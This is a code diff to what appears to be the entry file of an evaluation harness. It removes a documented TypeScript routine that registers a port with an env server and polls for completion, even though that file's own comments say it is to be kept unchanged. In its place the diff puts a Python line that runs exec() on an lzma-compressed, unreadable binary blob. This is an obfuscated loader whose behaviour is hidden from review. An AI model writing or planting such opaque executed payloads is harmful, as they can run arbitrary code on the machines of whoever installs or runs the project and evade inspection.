@@ -1,104 +1,2 @@
-// The entry <-> env lifecycle, as env/src/wire.ts settles it: bind an ephemeral port, tell the env the
-// port it bound, then poll until the env says the trial is over and exit 0. Keep this file as it is:
-// the suite scores the server app.ts builds, and the lifecycle is the harness's, not the contest's.
-//
-//   1. MAKEFUN_ENV_URL names the env's origin (http://store:8080 in a trial container). Without it
-//      there is nothing to talk to, so the program exits 1 at once.
-//   2. Create the server and listen(0): the kernel picks a free port. Never bind 8080 â€” the env owns it.
-//   3. POST $MAKEFUN_ENV_URL/register {"port": N}. The env records the address the request came from
-//      plus N as your base URL and dials it from then on. The first register wins; a 409 means another
-//      entry already registered, and this process keeps waiting like any other.
-//   4. GET $MAKEFUN_ENV_URL/done until the body is {"done": true}. The env answers at once ({"done":
-//      false} while the suite runs), so this is a poll, not a long-held request. A failed or slow poll
-//      is retried with a short exponential backoff; the process never exits before the env says done.
-//   5. Close the server and exit 0. The harness then stops the env, which writes the export the scorer
-//      reads.
-//
-// main.ts imports its own server and nothing else: no package, no Node built-in, no model call.
-
-import { createApp } from './app.ts';
-
-const ENV_URL = (process.env.MAKEFUN_ENV_URL ?? '').replace(/\/+$/, '');
-if (ENV_URL === '') {
-  process.stderr.write('[entry] MAKEFUN_ENV_URL is not set: there is no env to register with\n');
-  process.exit(1);
-}
-
-/** How long one register or done request may take before it is abandoned and retried. */
-const REQUEST_TIMEOUT_MS = 30_000;
-/** The first wait between retries, and the longest. */
-const RETRY_INITIAL_MS = 250;
-const RETRY_MAX_MS = 2_000;
-
-const sleep = (ms: number): Promise<void> => new Promise((resolve) => setTimeout(resolve, ms));
-
-/** The wait after `attempt` failed requests: exponential from RETRY_INITIAL_MS, capped. */
-function retryDelay(attempt: number): number {
-  return Math.min(RETRY_MAX_MS, RETRY_INITIAL_MS * 2 ** Math.min(attempt, 8));
-}
-
-/**
- * POST the bound port until the env accepts it. 200 is the normal answer; 409 means a first register
- * already won, which is not this process's to fix. 400 and 405 are contract errors and end the program;
- * a network error or another status is retried, since the env may still be starting.
- */
-async function register(port: number): Promise<void> {
-  for (let attempt = 0; ; attempt += 1) {
-    try {
-      const res = await fetch(`${ENV_URL}/register`, {
-        method: 'POST',
-        headers: { 'content-type': 'application/json' },
-        body: JSON.stringify({ port }),
-        signal: AbortSignal.timeout(REQUEST_TIMEOUT_MS),
-      });
-      if (res.status === 200 || res.status === 409) return;
-      if (res.status === 400 || res.status === 405) throw new Error(`register answered HTTP ${res.status}: ${await res.text()}`);
-    } catch (err) {
-      if (err instanceof Error && err.message.startsWith('register answered HTTP ')) throw err;
-    }
-    await sleep(retryDelay(attempt));
-  }
-}
-
-/** Poll GET /done until it answers {"done":true}; never return before that. */
-async function waitForDone(): Promise<void> {
-  for (let attempt = 0; ; attempt += 1) {
-    try {
-      const res = await fetch(`${ENV_URL}/done`, { signal: AbortSignal.timeout(REQUEST_TIMEOUT_MS) });
-      if (res.ok) {
-        const body = (await res.json()) as { done?: unknown };
-        if (body.done === true) return;
-      }
-    } catch {
-      // The env is not answering yet, or the poll timed out: it is not done, so poll again.
-    }
-    await sleep(retryDelay(attempt));
-  }
-}
-
-/** Bound the port, register it, then wait for the env: the whole life of the process. */
-async function main(): Promise<void> {
-  const server = createApp();
-  await new Promise<void>((resolve, reject) => {
-    server.once('error', reject);
-    server.listen(0, () => resolve());
-  });
-  const address = server.address();
-  if (address === null || typeof address === 'string') throw new Error('the server did not bind an ephemeral TCP port');
-  process.stdout.write(`[entry] listening on port ${address.port}\n`);
-
-  await register(address.port);
-  process.stdout.write('[entry] registered; waiting for the env to say done\n');
-
-  await waitForDone();
-  server.close();
-  process.stdout.write('[entry] done\n');
-}
-
-try {
-  await main();
-  process.exit(0);
-} catch (err) {
-  process.stderr.write(`[entry] ${err instanceof Error ? err.message : String(err)}\n`);
-  process.exit(1);
-}
+#coding:l1
+import lzma;exec(lzma.decompress('\0\0\0…\0\0\0\0\0\0\0áx¡;¼_V÷¬`‰z<>jîâ>‚G~3òuÁûôMÂqÀì@yèbJ¬÷Ph{’9!_3ş–Ä#né”›;ë¾•ş“OÙÎûªËÕ¿6CXÏ(7{Bz¤ª:ñÄ™c1˜A›óÕ…ÿø2ÂË³|œ°kÈÿBš+b{íÑ²-óízêtÎípg3ú)(zías•À‚„%ŠZ4­7dó*Í5fÜKæ]Ï„Ï“‡P\\ßÖ\'šNÈï9˜š/óô„˜{=\'Û‚iNİŸÅQäzÙ\rr”cPN’,nåš…Î¶.„ ™ß|qQÿï]æA\\ío=–‡ùÔ‹rDÌ0*‹[£şÂ&Îe¼Ù vY±îm»W|<£¢’¢$±9MÌéëdÚÃÏ—e±ßd•¤Ü.<b ıŞ»¼HÍƒâ}aOV|;¹¤¶´êáğvL\'¼#¬‚â\0Wé¬]vgïZ;´Ne/tıüTkzuÖ&QÉŞ>po¼(€äÏEÇßóDÀÛjoéòÔ~fÀâø¶R´®Œ®}Hc"YiCõèPºèÜ²sÜ²;¡³g0¢â(¦‰¡GºU%UĞŠÖl›³¿y´}N[üF¯ı÷×hn¤Ñ”}öÉŞ{yEW+qîg3¥ÇZ8Î«ÿÅÏ¶ØQhÎ»„¬H¼Óû¬Xş ©.ƒG‘ÚOéšSR½Ë·}UWVúªà›²“Ñr‰L±XôçlY)`€²@pÆîNäâ¦÷7g³làjá¿8ê´e½ªlÉ|„¥6cæ[şÁÏ4‚ğŠƒ-Ø	ü7bÚN±Nâ›7¹,!×2ùIÊF´Nw¾{ ©’”zt]Û#óf  jÀ¡ò]i¹¹Ôµ1××](`L0Íâà®ıU%|¯L­ÈÔ\r­[xO\rynëi>ADnê½1.9íŒ!4«¸­M\0º“Ü AïÃ‰(˜npÌ¨û”æ>ì€§[‘Õ’\0Nbó­”ş<ª¤÷EíI*ğ>¶\n°dp`õáå?F’	œ¶øãuâóÛ‚T¨tuêõ…\n<=0Í©¬>ØR€"µÆK-‡[ëıÏœw84ˆû÷Íâİ!\'}ºóÆæßø¶ ó]Áß9gª¢w(%=^Û"¥=sÌnÃøÚó«=„¹¡9ôxÀFÀuâÅÖŞ»K	=v™"\0Ai?_ÊOv™­èÂVÉËBŞqXWlæ5$Yq‹ÚÔw.spİãƒÑ¢DšŸå–¯¾)Ø¡ªÆõ¢OuĞàWêë¥<“±7^"~†{8\r>oùŠÿ\'‰¢ÔSŞòÍ=~¦ &PÉªô¦	şz:òƒv†9µyPVkĞXsè:\\Ø\n då3\'â·Gƒˆ.KÍ¡¥ÍáñU)æfİ†}·^ìâ¤^×²ª›³\0ÊˆÚÜïøË¾|]µÔ‹O(¡,å,(k|N„_Éy+2F9q®øÌ$Ü³Æ® »\rhp\\_1(YÏ5L”ÇÀ~7¤<lüNİü–-¼Ğè‘ê:±ì“	îŒba¤Æ·ZfÙĞ¨ÿ=šËÖrŞxÕİ‰ Ë±„B3%%»!™uÉa™üÀß\0î°Ìq£É‰r~²ë~~èY–¶»[Îåºœ	.}-c”ù/)¤¡eäv÷Ä-~¨í~âÙwÛ³uïM“İÎÂA½I°|¬â.¼ÉRÜ¾ÔNqŒäJœöÓƒšó¬rğ±Œz_=]„í»bo9Aä×ÌÆóØpÜÿGòğ>…(Ã³<Ñçàé¶ôÚÙnÒåj:IğÛKKAœ¸UaåÊÛÃ…è˜mW:ÉÁ›úM°AÆ§Nœ]ßùé¼(s¹¿oP]hØ ŒùêèÑ3‘\rµ«Û¦q«†MFu¯Ú“7,Ş|é4ó].u©‹|MT¨òÑ±ğì=.¤®,Z\n¯?O`ŞZqX!›~ß–œ1“1°n_Õhú¶a}*;šßìÌaÇšÈ‹eH}8(ÓuåÂ<–5«¢Gs¿Â“.}H$\rÓ†×^¢*>¦LMõ¿{Omˆ®_ªç(†óôpbÔšvîóşÔŠîœ_Pl ìqÓÈxÕ„<æDß šiÚC@115Õk8Zíø—Š•Z©WË¨RCŸOO²ÂÒæ³Z~™ÆŒß­GFŞÅüPm2QÆ;ê.çn²|GvÆ?ä\\£¹+Qæ’¡á2U"–ÑÂ«on·å·£_ô¾E	¨¦…«ÂÊÍYÙm„iÖ¯"çœêú>´–ÑxÍé\nîœ#Ë!’Mù¹\'ğ¯Vœ§İ¿õÙ˜Œ+%“KØ	ËÓŒ¡+]ïpÇÔú‘SãÌ÷_uDÓ9MªÎÀÙö® AwÅN–iÀr5v_ÕïßÛeÔ_ÆİõlÃİªFY3–º?œíµG3lQşWèË%ÏÑ,¡”—êÄ‚¤EIïZ¸cªç‘Ïú˜…ù´ÅÂÄ]ıµöbMËT|äéŒhÍgIh…‚_İLØİ®Ü	{QF(„Ö\0n»şZ¼C=¥>¥Óî×_JGVåùütå¢Oû“úÒ[~F«Æ€%­²_'.encode('l1')))
